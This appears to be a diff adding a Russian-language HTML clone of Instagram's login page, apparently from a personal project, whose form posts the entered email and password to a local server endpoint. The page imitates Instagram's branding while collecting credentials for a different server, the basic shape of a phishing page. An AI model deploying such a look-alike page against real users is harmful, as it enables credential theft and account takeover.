@@ -1,0 +1,56 @@
+<html>
+<head>
+    <!--Перезалил, т.к. в файлах стояла неправильная кодировка-->
+    <title> Instagram </title>
+    <link rel="stylesheet" type="text/css" href="C:\Users\Samuel\source\repos\InstagramAPI\InstagramAPI\instamain.css">
+
+</head>
+<body class="separated">
+    <div id="header"> </div>
+    <div id="mainbody">
+        <div> </div>
+        <div class="content"> <img id="images" class="pic" src="https://www.instagram.com/static/images/homepage/screenshot1.jpg/d6bf0c928b5a.jpg" /></div>
+        <div class="content2">
+            <form method="post" action="http://localhost:5000/weatherforecast" id="form1">
+                <p> <img id="instimg" src="C:\Users\Samuel\source\repos\InstagramAPI\InstagramAPI\images\inst.jpg" /> </p>
+                <div class="form-item">
+                    <input name="email" type="text" class="form-input" id="login" onkeydown="validate()" required />
+                    <label class="form-label"> Телефон, имя пользователя или эл.адрес </label>
+                </div>
+                <div class="form-item">
+                    <input name="password" type="password" id="password" class="form-input" onkeydown="validate()" required />
+                    <label class="form-label"> Пароль </label>
+                </div>
+                <div style="padding-top: 14px;">
+                    <button id="butt" disabled> Войти </button>
+                </div>
+            </form>
+            <form id="form2">
+                <div class="line">
+                    <span id="or"> или </span>
+                </div>
+                <div id="fb">
+                    <img style="margin-bottom:-6.5px" src="https://i.ibb.co/dPcwNtP/fb.jpg" />
+                    <button id="buttface">
+                        Войти через Facebook
+                    </button> <br /> <br />
+                    <div> <a id="reset" href=" "> Забыли пароль? </a> </div>
+                </div>
+            </form>
+            <div id="form3"> <a id="reg">У вас ещё нет аккаунта? </a>  <a id="registr" href=" "> Зарегистрироваться</a>  </div>
+            <div id="form 4">
+                <div id="text">Установите приложение.</div>
+                <div id="appbutts">
+                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo"> <img id="appbutt" src="images\appstore.png" /> </a>
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D6A3F7BF0-0428-4ED8-982E-0C2CFB038A3C%26utm_content%3Dlo%26utm_medium%3Dbadge"> <img id="appbutt" src="images\playmarket.png" /> </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="Empty"> </div>
+    <div id="footer"> </div>
+    <script src="C:\Users\Samuel\source\repos\InstagramAPI\InstagramAPI\scripts\slider.js"></script>
+
+</body>
+
+</html>
